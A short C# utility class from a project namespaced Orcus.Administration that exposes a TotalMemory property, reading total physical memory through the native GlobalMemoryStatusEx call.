using Orcus.Administration.Core.Native;

namespace Orcus.Administration.Core.Utilities
{
    public static class Computer
    {
        public static ulong TotalMemory
        {
            get
            {
                MEMORYSTATUSEX memStatus = new MEMORYSTATUSEX();
                if (NativeMethods.GlobalMemoryStatusEx(memStatus))
                    return memStatus.ullTotalPhys;

                return 0;
            }
        }
    }
}